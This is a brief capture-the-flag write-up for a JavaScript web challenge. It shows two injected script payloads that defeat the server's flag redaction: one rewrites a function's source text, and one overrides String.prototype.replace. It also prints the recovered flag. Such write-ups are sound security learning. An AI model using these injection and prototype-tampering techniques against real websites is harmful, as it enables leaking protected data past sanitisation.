# Description

I made a JS API! Sadly I had no time to finish it :(
But I had time to make it harder!

# Solution

They did not make it harder. The only new thing in this challenge (compared to the other `todo` challenge) was that once the flag was discovered, they replaced it in the
`server.js`:
```javascript
await page.evaluate((flag) => { document.body.outerHTML = document.body.outerHTML.replace(flag, "nope") }, flag)
```

My solution was to replace a random character in the flag, which then does not do the replace:
```javascript
<script>
  FlagAPI.valueOf = Function.prototype.toString;
  var a = FlagAPI.valueOf();
  a = a.substring(0, 340) + 'x' + a.substring(341);
  document.write(a);
</script>
```

which returns `GPNCTF{TH4T W45_D3FIN1T3LY_NOT_4N_xV3RSIGHT}` and we can replace the `x` with `O` or `0`.

Even better solution is to rewrite the prototype function `replace` so that it actually does not replace but rather print the flag (notice how we don't even
need to access the `script.js` as the flag actually leaks directly from the `replace` function):
```javascript
<script>
  "".__proto__.replace = (a,b) => (a);
</script>
```
